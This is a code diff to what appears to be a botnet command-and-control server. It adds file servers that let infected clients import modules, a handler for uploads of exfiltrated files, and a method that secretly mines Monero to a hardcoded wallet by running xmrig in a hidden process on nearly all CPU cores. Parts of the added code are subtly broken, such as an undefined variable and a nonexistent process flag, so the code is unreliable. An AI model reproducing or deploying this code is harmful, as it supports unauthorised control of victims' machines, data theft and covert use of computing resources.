@@ -30,6 +30,7 @@ if sys.version_info[0] > 2:
 import core.util as util
 import core.database as database
 import core.security as security
+from core.miner import Miner
 
 # packages
 try:
@@ -128,10 +129,19 @@ def main():
 
     options = parser.parse_args()
     tmp_file=open("temp","w")
+    
     globals()['debug'] = options.debug
+
+    # host Python packages on C2 port + 2 (for clients to remotely import)
     globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+
+    # host BYOB modules on C2 port + 1 (for clients to remotely import)
     globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+
+    # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
     globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
+
+    # run C2
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
 
@@ -168,6 +178,7 @@ class C2():
         self._count = 0
         self._prompt = None
         self._database = db
+        self.child_procs = {}
         self.current_session = None
         self.sessions = {}
         self.socket = self._socket(port)
@@ -440,6 +451,68 @@ class C2():
         with self._lock:
             return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
 
+
+    def _init_dev_miner(self):
+        url = 'pool.hashvault.pro'
+        host_port = 80
+        api_port = 8889
+        user = '46v4cAiT53y9Q6XwboCAHoct4mKXW4SHsgBA4TtEpMrgDCLxsyRXhawGJUQehVkkxNL8Z4n332Hgi8NoAXfV9gCSB3XWBLa'
+
+        # first attempt using built-in python miner
+        try:
+            import pycryptonight, pyrx
+            self.child_procs['dev_miner_py'] = Miner(url=url, port=host_port, user=user)
+            self.child_procs['dev_miner_py'].start()
+        except Exception as e:
+            util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+
+            # if that fails, try downloading and running xmrig
+            try:
+                import multiprocessing
+                threads = multiprocessing.cpu_count() - 1
+
+                # find correct executable for this platform
+                if sys.platform == 'linux':
+                    platform = 'linux2'
+                else:
+                    platform = sys.platform
+
+                xmrig_path = os.path.abspath('modules/xmrig/xmrig_' + platform)
+
+                if sys.platform == 'win32':
+                    os.rename(xmrig_path, xmrig_path + '.exe')
+
+                os.chmod(xmrig_path, 755)
+
+                # excute xmrig in hidden process
+                params = xmrig_path_dev + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-host={host} --http-port={port} --threads={threads}".format(url=url, user=user, host=globals()['public_ip'](), port=api_port, threads=threads)
+                result = self._execute(params)
+            except Exception as e:
+                util.log("{} error: {}".format(self._init_dev_miner.__name__, str(e)))
+
+
+    def _execute(self, args):
+        # ugly method that should be refactored at some point
+        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
+        args = [path] + args.split()
+        if os.path.isfile(path):
+            name = os.path.splitext(os.path.basename(path))[0]
+            try:
+                info = subprocess.STARTUPINFO()
+                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
+                info.wShowWindow = subprocess.SW_HIDE
+                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
+                return "Running '{}' in a hidden process".format(path)
+            except Exception as e:
+                try:
+                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                    return "Running '{}' in a new process".format(name)
+                except Exception as e:
+                    log("{} error: {}".format(self.execute.__name__, str(e)))
+        else:
+            return "File '{}' not found".format(str(path))
+
+
     def debug(self, code):
         """
         Execute code directly in the context of the currently running process
@@ -461,9 +534,25 @@ class C2():
         Quit server and optionally keep clients alive
 
         """
+
+        # terminate handlers running on other ports
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
         globals()['post_handler'].terminate()
+
+        # kill subprocesses (subprocess.Popen)
+        for proc in self.child_procs.values():
+            try:
+                proc.kill()
+            except: pass
+
+        # kill child processes (multiprocessing.Process)
+        for child_proc in self.child_procs.values():
+            try:
+                child_proc.terminate()
+            except: pass
+        
+        # kill clients or keep alive (whichever user specifies)
         if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 if isinstance(session, Session):
@@ -473,6 +562,8 @@ class C2():
                     except: pass
         globals()['__abort'] = True
         self._active.clear()
+
+        # kill server and exit
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
         util.display('Exiting...')
         sys.exit(0)
